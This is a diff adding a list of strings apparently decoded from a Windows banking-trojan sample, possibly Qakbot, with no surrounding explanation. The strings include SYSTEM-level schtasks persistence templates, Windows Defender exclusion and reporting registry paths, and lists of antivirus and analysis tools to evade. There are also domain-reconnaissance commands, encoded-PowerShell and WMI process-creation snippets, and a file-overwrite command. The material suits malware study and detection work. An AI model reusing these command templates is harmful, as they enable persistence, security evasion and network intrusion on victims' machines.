@@ -1,0 +1,201 @@
+Win32_ComputerSystem
+root\SecurityCenter2
+type=0x%04X
+reg.exe ADD "HKLM\%s" /f /t %s /v "%s" /d "%s"
+application/x-shockwave-flash
+winsta0\default
+aswhooka.dll
+Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\%coot\cimv2")
+Set colFiles = objWMIService.ExecQuery("Select * From CIM_DataFile Where Name = '%s'")
+For Each objFile in colFiles
+objFile.Copy("%s")
+Next
+mcshield.exe
+%SystemRoot%\System32\msra.exe
+%SystemRoot%\SysWOW64\xwizard.exe
+dwengine.exe;dwarkdaemon.exe;dwwatcher.exe
+%SystemRoot%\System32\mobsync.exe
+https
+.cfg
+%SystemRoot%\SysWOW64\msra.exe
+bcrypt.dll
+setupapi.dll
+NTUSER.DAT
+coreServiceShell.exe;PccNTMon.exe;NTRTScan.exe
+%SystemRoot%\System32\OneDriveSetup.exe
+%SystemRoot%\System32\wermgr.exe
+.dat
+egui.exe;ekrn.exe
+vkise.exe;isesrv.exe;cmdagent.exe
+%SystemRoot%\SysWOW64\explorer.exe
+%SystemRoot%\System32\xwizard.exe
+snxhk_border_mywnd
+MBAMService.exe;mbamgui.exe
+frida-winjector-helper-32.exe;frida-winjector-helper-64.exe;tcpdump.exe;windump.exe;ethereal.exe;wireshark.exe;ettercap.exe;rtsniff.exe;packetcapture.exe;capturenet.exe;qak_proxy;dumpcap.exe;CFF Explorer.exe;not_rundll32.exe;ProcessHacker.exe;tcpview.exe;filemon.exe;procmon.exe;idaq64.exe;PETools.exe;ImportREC.exe;LordPE.exe;SysInspector.exe;proc_analyzer.exe;sysAnalyzer.exe;sniff_hit.exe;joeboxcontrol.exe;joeboxserver.exe;ResourceHacker.exe;x64dbg.exe;Fiddler.exe;sniff_hit.exe;sysAnalyzer.exe
+SOFTWARE\Microsoft\Windows Defender\SpyNet
+%SystemRoot%\SysWOW64\OneDriveSetup.exe
+WRSA.exe
+Caption,Description,Vendor,Version,InstallDate,InstallSource,PackageName
+ALLUSERSPROFILE
+user32.dll
+image/pjpeg
+mpr.dll
+SELECT * FROM AntiVirusProduct
+SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
+ from 
+aswhookx.dll
+WScript.Sleep %u
+Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\%coot\cimv2")
+Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
+errReturn = objProcess.Create("%s", null, nul, nul)
+WSCript.Sleep 2000
+Set fso = CreateObject("Scripting.FileSystemObject")
+fso.DeleteFile("%s")
+*/*
+Caption
+fmon.exe
+Win32_Bios
+vbs
+Content-Type: application/x-www-form-urlencoded
+open
+Win32_PnPEntity
+ccSvcHst.exe
+SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths
+S:(ML;;NW;;;LW)
+avp.exe;kavtray.exe
+CommandLine
+%ProgramFiles(x86)%\Internet Explorer\iexplore.exe
+SOFTWARE\Wow6432Node\Microsoft AntiMalware\SpyNet
+Create
+%SystemRoot%\SysWOW64\mobsync.exe
+c:\\
+advapi32.dll
+Mozilla/5.0 (Windows NT 6.1; rv:77.0) Gecko/20100101 Firefox/77.0
+wtsapi32.dll
+.dll
+rundll32.exe 
+t=%s time=[%02d:%02d:%02d-%02d/%02d/%d]
+abcdefghijklmnopqrstuvwxyz
+Software\Microsoft
+%SystemRoot%\SysWOW64\explorer.exe
+Packages
+MsMpEng.exe
+fshoster32.exe
+SOFTWARE\Microsoft\Microsoft AntiMalware\SpyNet
+.exe
+FALSE
+APPDATA
+ws2_32.dll
+%SystemRoot%\explorer.exe
+Win32_Process
+SOFTWARE\Wow6432Node\Microsoft\Windows Defender\Spynet
+{%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X}
+Win32_DiskDrive
+SpyNetReporting
+ntdll.dll
+LocalLow
+LastBootUpTime
+Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\%coot\cimv2")
+Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
+errReturn = objProcess.Create("%s", null, nul, nul)
+WQL
+pstorec.dll
+SysWOW64
+Win32_PhysicalMemory
+TRUE
+image/gif
+LOCALAPPDATA
+select 
+SELECT * FROM Win32_OperatingSystem
+aaebcdeeifghiiojklmnooupqrstuuyvwxyyaz
+%SystemRoot%\explorer.exe
+avgcsrvx.exe;avgsvcx.exe;avgcsrva.exe
+wmic process call create 'expand "%S" "%S"'
+
+userenv.dll
+netapi32.dll
+Initializing database...
+SELECT * FROM Win32_Processor
+System32
+iphlpapi.dll
+image/jpeg
+cmd.exe
+ROOT\CIMV2
+aabcdeefghiijklmnoopqrstuuvwxyyz
+wbj.go
+WBJ_IGNORE
+SAVAdminService.exe;SavService.exe
+wininet.dll
+\\.\pipe\
+C:\INTERNAL\__empty
+Win32_Product
+\sf2.dll
+%ProgramFiles%\Internet Explorer\iexplore.exe
+Winsta0
+wpcap.dll
+shell32.dll
+bdagent.exe;vsserv.exe;vsservppl.exe
+Name
+kernel32.dll
+%S.%06d
+displayName
+1234567890
+crypt32.dll
+AvastSvc.exe
+SystemRoot
+%s\system32\
+ByteFence.exe
+SubmitSamplesConsent
+Caption,Description,DeviceID,Manufacturer,Name,PNPDeviceID,Service,Status
+urlmon.dll
+c:\hiberfil.sysss
+shlwapi.dll
+cscript.exe
+%SystemRoot%\SysWOW64\wermgr.exe
+ProgramData
+arp -a
+route print
+amstream.dll
+schtasks.exe /Create /RU "NT AUTHORITY\SYSTEM" /SC ONSTART /TN %u /TR "%s" /NP /F
+%s %04x.%u %04x.%u res: %s seh_test: %u consts_test: %d vmdetected: %d createprocess: %d
+Muhcu#YgcdXubYBu2@2ub4fbUhuiNhyVtcd
+SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList
+Self test FAILED!!!
+cmd /c set
+regsvr32.exe 
+3c91e639
+Start screenshot
+ipconfig /all
+net share
+ /c ping.exe -n 6 127.0.0.1 &  type "%s\System32\calc.exe" > "%s"
+Self test OK.
+qwinsta
+net view
+SELF_TEST_1
+/t5
+schtasks.exe /Delete /F /TN %u
+.lnk
+Microsoft
+net localgroup
+ERROR: GetModuleFileNameW() failed with error: %u
+\System32\WindowsPowerShell\v1.0\powershell.exe
+whoami /all
+ERROR: GetModuleFileNameW() failed with error: ERROR_INSUFFICIENT_BUFFER
+powershell.exe
+error res='%s' err=%d len=%u
+SoNuce]ugdiB3c[doMuce2s81*uXmcvP
+netstat -nao
+SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+at.exe %u:%u "%s" /I
+ProfileImagePath
+%s \"$%s = \\\"%s\\\\; & $%s\"
+powershell.exe -encodedCommand %S
+powershell.exe -encodedCommand 
+nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%s
+Self check ok!
+nltest /domain_trusts /all_trusts
+"%s\system32\schtasks.exe" /Create /ST %02u:%02u /RU "NT AUTHORITY\SYSTEM" /SC ONCE /tr "%s" /Z /ET %02u:%02u /tn %s
+Self check
+89210af9
+%s "$%s = \"%s\"; & $%s"
+c:\ProgramData
